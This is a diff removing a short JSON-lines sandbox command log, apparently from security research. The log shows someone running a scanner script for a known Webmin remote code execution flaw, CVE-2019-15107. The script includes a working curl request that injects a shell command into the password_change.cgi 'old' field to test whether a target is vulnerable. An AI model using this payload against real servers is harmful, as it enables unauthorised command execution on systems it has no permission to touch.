@@ -1,9 +1,0 @@
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:51:53.320974+02:00", "cmd_type": "bash-command", "cmd": "sh CVE-2019-15107.sh"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.341335+02:00", "cmd_type": "bash-command", "cmd": "sh CVE-2019-15107.sh #!/bin/sh"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.403367+02:00", "cmd_type": "bash-command", "cmd": "FLAG=\"f3a0c13c3765137bcde68572707ae5c0\""}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.434082+02:00", "cmd_type": "bash-command", "cmd": "URI=$1;"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.476070+02:00", "cmd_type": "bash-command", "cmd": "echo -n \"Testing for RCE (CVE-2019-15107) on $URI: \";"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.510554+02:00", "cmd_type": "bash-command", "cmd": "curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H \"Content-Type: application/x-www-form-urlencoded\" -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:05.743028+02:00", "cmd_type": "bash-command", "cmd": "if [ $? -eq 0 ]; then echo '\\033[0;31mVULNERABLE!\\033[0m'; else echo '\\033[0;32mOK! (target is not vulnerable)\\033[0m'; fi"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:10.929652+02:00", "cmd_type": "bash-command", "cmd": "ls"}
-{"sandbox_id": "71", "timestamp_str": "2020-07-15T09:52:15.282589+02:00", "cmd_type": "bash-command", "cmd": "cat CVE-2019-15107.sh"}
